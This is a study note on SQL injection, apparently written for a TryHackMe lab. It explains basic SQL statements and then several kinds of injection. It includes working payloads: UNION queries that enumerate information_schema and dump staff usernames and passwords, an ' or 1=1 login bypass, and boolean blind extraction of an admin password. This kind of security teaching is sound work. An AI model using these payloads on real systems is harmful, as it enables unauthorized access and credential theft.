# SQL Injection
SQL is a feature rich language used for querying databases. These SQL Queries are refered to as statements.

# Queries 
## SELECT
SELECT query is used to retrive data from a table 
1.  `SELECT * FROM users;` -> displays everything from the `users` table.
2.  `SELECT username, password from users;` -> this displays only the `username` and `password` column from the table.
3.  `SELECT * FROM users LIMIT 1;` -> this will only display one row, `SELECT * FROM users  LIMIT 1,1;` -> this skips the 1st row.
4.  `select * from users where username like 'a%';` This displays only the username starting from the letter 'a'.
5.  `select * from users where username like '%n';` This displays only the usernames ending with letter 'n'.
6.  `select * from users where username like '%mi%';` This displays only the usernames containing 'mi' in them.

## UNION
The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.
`SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;` Here it will retrive data from both tables, combines it and gives the result.

## INSERT
The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.
`insert into users (username,password) values ('bob','password123');` -> inserts the username and password into the user table.

## UPDATE
The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally, similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".
`update users SET username='root',password='pass123' where username='admin';`

## DELETE
The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to return, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

`delete from users where username='martin';` -> deletes the data of the user whose username is 'martin'


# Type of SQLi
## In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

## Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

## Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 
## Methodology
1. When you get the ID parameter anywhere, just try to send `'` or `"`. If this gives error then try ?id=1 `UNION 1`
2. If the number of table doesnt match it will give error until you put the right number. Then again enter ?id=1 `UNION 1,2`
3. Replace the ?id=1 to `?id=0 UNION SELECT 1,2,database()` and you will be able to see the database name.
4. ?id=0 `UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'` -> There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
5. `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` -> This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.
6. `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`  -> Again, we use the group_concat method to return all of the rows into one string and make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

## Blind SQLi
Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database

## Authentication Bypass using blind sqli
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms.
1. You will be seeing the login form where you need to enter the username and the password.
2. In the field of entering valid username or password, just enter `%username%` and `%password%`
   In the background the code will look like ` select * from users where username='%username%' and password='%password%' LIMIT 1;`
3. You can use the payload `' or 1=1;--`

## Boolean Based
Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.

## Practical 
MUST EXECUTE THIS IN THE URL (eg: `http://webiste.thm/login?username=admin' UNION SELECT 1,2,3;--`)
1. Enter the valid and invalid usernames and check for response from the server.
2. Check for the available number of columns using `UNION SELECT 1,2,3;--
3. Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is to discover the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.
`?username=admin123' UNION SELECT 1,2,3 where database() like '%';--`
4. We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as " - " and " _ " until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter 's'. YOU CAN ADD THE NUMBERS TOO
`?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--`
5. since we have the database name we can now enumerate the table names using similar method utilising infotmation_schema database. Use the same method used to enumerate the database name. (table name = users)
   `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
6. Now we need to enumerate the column name from the users table so that we can search for exact credentials, we can use the similiar method and get the column name. Use the payload given below (found column: id)
   `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--`
7. similiarly do the same to find the username from the column
   `admin123' UNION SELECT 1,2,3 from users where username like 'a%';--`
8. once you find the username then dump the password.
   `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--`

# Time-Based
A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 



